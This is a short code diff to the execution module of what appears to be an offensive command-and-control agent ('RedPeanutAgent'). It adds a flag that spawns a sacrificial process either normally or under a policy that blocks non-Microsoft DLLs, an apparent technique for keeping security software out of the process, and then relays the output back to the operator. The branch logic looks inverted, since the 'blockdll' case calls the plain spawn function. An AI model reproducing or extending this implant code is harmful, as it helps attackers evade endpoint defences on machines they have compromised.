@@ -175,7 +175,7 @@ namespace RedPeanutAgent.Execution
             SendResponse(output);
         }
 
-        public void ExecuteModuleUnManaged()
+        public void ExecuteModuleUnManaged(bool blockdll)
         {
 
             string output = "";
@@ -188,9 +188,19 @@ namespace RedPeanutAgent.Execution
             }
 
             Core.Natives.PROCESS_INFORMATION procInfo = new Core.Natives.PROCESS_INFORMATION();
-            if (!Spawner.CreateProcess(hReadPipe, hWritePipe, this.processname, true, ref procInfo))
+            if (blockdll)
             {
-                return;
+                if (!Spawner.CreateProcess(hReadPipe, hWritePipe, this.processname, true, ref procInfo))
+                {
+                    return;
+                }
+            }
+            else
+            {
+                if (!Spawner.CreateProcessPCMPBNMBSAO(hReadPipe, hWritePipe, this.processname, true, ref procInfo))
+                {
+                    return;
+                }
             }
 
             string pipename = GetPipeName(procInfo.dwProcessId);
